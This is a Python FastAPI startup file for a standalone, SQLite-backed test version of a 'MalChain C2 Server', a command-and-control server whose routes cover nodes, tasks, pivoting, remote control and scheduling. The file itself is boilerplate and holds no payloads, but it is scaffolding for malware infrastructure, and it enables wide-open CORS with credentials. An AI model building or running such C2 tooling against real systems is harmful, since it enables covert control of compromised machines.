"""
Standalone version - Works without PostgreSQL/Redis
For local testing only
"""
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager

# Import routes
from api.routes import nodes, tasks, websocket, pivot, remote_control, statistics, scheduler

# Simplified database (SQLite)
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
from sqlalchemy.orm import declarative_base
import os

# SQLite database
DATABASE_URL = "sqlite+aiosqlite:///./malchain.db"

engine = create_async_engine(
    DATABASE_URL,
    echo=True,
    future=True,
    connect_args={"check_same_thread": False}  # SQLite specific
)

AsyncSessionLocal = async_sessionmaker(
    engine,
    class_=AsyncSession,
    expire_on_commit=False
)

Base = declarative_base()


async def init_db():
    from models.node import Node
    from models.task import Task

    async with engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)


@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    await init_db()
    app.state.engine = engine
    print("✅ C2 Server started (Standalone mode - SQLite)")
    print("📊 Database: SQLite (malchain.db)")
    print("⚠️  Redis disabled in standalone mode")
    yield
    # Shutdown
    print("C2 Server shutdown")


app = FastAPI(
    title="MalChain C2 Server (Standalone)",
    description="Command & Control server - Standalone mode for testing",
    version="1.0.0-standalone",
    lifespan=lifespan
)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Include routers
app.include_router(nodes.router)
app.include_router(tasks.router)
# app.include_router(websocket.router)  # Requires Redis
app.include_router(pivot.router)
app.include_router(remote_control.router)
app.include_router(statistics.router)
app.include_router(scheduler.router)


@app.get("/")
async def root():
    return {
        "service": "MalChain C2 Server",
        "version": "1.0.0-standalone",
        "status": "operational",
        "mode": "standalone",
        "database": "SQLite",
        "note": "Use docker-compose for full features"
    }


@app.get("/health")
async def health_check():
    return {"status": "healthy", "mode": "standalone"}


if __name__ == "__main__":
    import uvicorn

    uvicorn.run(
        "main_standalone:app",
        host="0.0.0.0",
        port=8000,
        reload=True
    )
